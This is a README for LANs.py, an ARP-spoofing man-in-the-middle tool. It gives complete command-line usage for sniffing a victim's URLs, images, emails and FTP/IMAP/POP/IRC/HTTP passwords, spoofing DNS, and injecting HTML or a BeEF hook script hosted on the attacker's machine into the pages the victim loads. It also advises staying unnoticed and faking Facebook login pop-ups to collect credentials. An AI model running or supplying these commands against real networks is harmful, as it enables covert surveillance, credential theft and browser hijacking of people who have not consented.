LANs.py
========

Multithreaded asynchronous packet parsing/injecting arp spoofer.

Individually arpspoofs the target box, router and DNS server if necessary. Does not poison anyone else on the network. Displays all most the interesting bits of their traffic and can inject custom html into pages they visit. Cleans up after itself.


Prereqs: Linux, scapy, python nfqueue-bindings 0.4.3+, aircrack-ng, python twisted, BeEF (optional), and a wireless card capable of promiscuous mode if you don't use the -ip option

Tested on Kali 1.0. In the following examples 192.168.0.5 will be the attacking machine and 192.168.0.10 will be the victim.



Complete Usage:

usage: LANs.py [-h] [-b BEEF] [-c CODE] [-u] [-ip IPADDRESS] [-vmac VICTIMMAC]
               [-d] [-v] [-dns DNSSPOOF] [-set] [-p] [-na] [-n] [-i INTERFACE]
               [-rip ROUTERIP] [-rmac ROUTERMAC] [-pcap PCAP]

Simplest usage:

```
python LANs.py
```

Because there's no -ip option this will arp scan the network, compare it to a live running promiscuous capture, and list all the clients on the nextwork including their Windows netbios names along with how many data packets they're sending. so you can immediately target the active ones. The ability to capture data packets they send is very dependant on physical proximity and the power of your network card. then you can Ctrl-C and pick your target which it will then ARP spoof. Simple target identification and ARP spoofing. 

Passive harvesting usage:

```
python LANs.py -u -d -p -ip 192.168.0.10
```

-u: prints URLs visited; truncates at 150 characters and filters image/css/js/woff/svg urls since they spam the output and are uninteresting

-d: open an xterm with driftnet to see all images they view

-p: print username/passwords for FTP/IMAP/POP/IRC/HTTP, HTTP POSTs made, all searches made, incoming/outgoing emails, and IRC messages sent/received; will also decode base64 if the email authentication is encrypted with it

-ip: target this IP address 

Easy to remember and will probably be the most common usage of the script: options u, d, p, like udp/tcp.


HTML injection:

```
python LANs.py -b http://192.168.0.5:3000/hook.js
```

Injecting BeEF hook URL into pages the victim visits.   


```
python LANs.py -c '<title>Owned.</title>'
```

Inject arbitrary HTML into pages the victim visits. First tries to inject it after the first `<head>` and failing that injects prior to the first `</head>`. This example will change the page title to 'Owned.'

More info about BEeF Project: (http://beefproject.com/, tutorial: http://resources.infosecinstitute.com/beef-part-1/)

Read from pcap:

```
python LANs.py -pcap libpcapfilename -ip 192.168.0.10
```

To read from a pcap file you must include the target's IP address with the -ip option. It must also be in libpcap form which is the most common anyway. One advantage of reading from a pcap file is that you do not need to be root to execute the script. 


Aggressive usage:
```
python LANs.py -v -d -p -n -na -set -dns facebook.com -c '<title>Owned.</title>' -b http://192.168.0.5:3000/hook.js -ip 192.168.0.10
```

All options:

```
python LANs.py -h
```

usage: LANs.py [-h] [-b BEEF] [-c CODE] [-u] [-ip IPADDRESS] [-vmac VICTIMMAC]
               [-d] [-v] [-dns DNSSPOOF] [-set] [-p] [-na] [-n] [-i INTERFACE]
               [-rip ROUTERIP] [-rmac ROUTERMAC] [-pcap PCAP]

optional arguments:
  -h, --help            show this help message and exit
  -b BEEF, --beef BEEF  Inject a BeEF hook URL. Example usage: -b
                        http://192.168.0.3:3000/hook.js
  -c CODE, --code CODE  Inject arbitrary html. Example usage (include quotes):
                        -c '<title>New title</title>'
  -u, --urlspy          Show all URLs and search terms the victim visits or
                        enters minus URLs that end in .jpg, .png, .gif, .css,
                        and .js to make the output much friendlier. Also
                        truncates URLs at 150 characters. Use -v to print all
                        URLs and without truncation.
  -ip IPADDRESS, --ipaddress IPADDRESS
                        Enter IP address of victim and skip the arp ping at
                        the beginning which would give you a list of possible
                        targets. Usage: -ip <victim IP>
  -vmac VICTIMMAC, --victimmac VICTIMMAC
                        Set the victim MAC; by default the script will attempt
                        a few different ways of getting this so this option
                        hopefully won't be necessary
  -d, --driftnet        Open an xterm window with driftnet.
  -v, --verboseURL      Shows all URLs the victim visits but doesn't limit the
                        URL to 150 characters like -u does.
  -dns DNSSPOOF, --dnsspoof DNSSPOOF
                        Spoof DNS responses of a specific domain. Enter domain
                        after this argument. An argument like [facebook.com]
                        will match all subdomains of facebook.com
  -set, --setoolkit     Start Social Engineer's Toolkit in another window.
  -p, --post            Print unsecured HTTP POST loads, IMAP/POP/FTP/IRC/HTTP
                        usernames/passwords and incoming/outgoing emails. Will
                        also decode base64 encrypted POP/IMAP
                        username/password combos for you.
  -na, --nmapaggressive
                        Aggressively scan the target for open ports and
                        services in the background. Output to
                        ip.add.re.ss.log.txt where ip.add.re.ss is the
                        victim's IP.
  -n, --nmap            Scan the target for open ports prior to starting to
                        sniffing their packets.
  -i INTERFACE, --interface INTERFACE
                        Choose the interface to use. Default is the first one
                        that shows up in `ip route`.
  -rip ROUTERIP, --routerip ROUTERIP
                        Set the router IP; by default the script with attempt
                        a few different ways of getting this so this option
                        hopefully won't be necessary
  -rmac ROUTERMAC, --routermac ROUTERMAC
                        Set the router MAC; by default the script with attempt
                        a few different ways of getting this so this option
                        hopefully won't be necessary
  -pcap PCAP, --pcap PCAP
                        Parse through a pcap file


Cleans the following on Ctrl-C:

--Turn off IP forwarding

--Flush iptables firewall

--Disables monitoring mode

--Individually restore each machine's ARP table



Technical details:

This script uses a python nfqueue-bindings queue wrapped in a Twisted IReadDescriptor to feed packets to callback functions. nfqueue-bindings is used to drop and forward certain packets. Python's scapy library does the work to parse and inject packets.

Injecting code undetected is a dicey game, if a minor thing goes wrong or the server the victim is requesting data from performs things in unique or rare way then the user won't be able to open the page they're trying to view and they'll know something's up. This script is designed to forward packets if anything fails so during usage you may see lots of "[!] Injected packet for www.domain.com" but only see one or two domains on the BEeF panel that the browser is hooked on. This is OK. If they don't get hooked on the first page just wait for them to browse a few other pages. The goal is to be unnoticeable. My favorite BEeF tools are in Commands > Social Engineering. Do things like create an official looking Facebook pop up saying the user's authentication expired and to re-enter their credentials.

#########################################
NOTE TO UBUNTU USERS:
You will need to update your nfqueue-bindings to the latest version (0.4.3 as time of writing) or you will have to edit the Parser.start() (around line 114) function to say:

def start(self, i, payload):
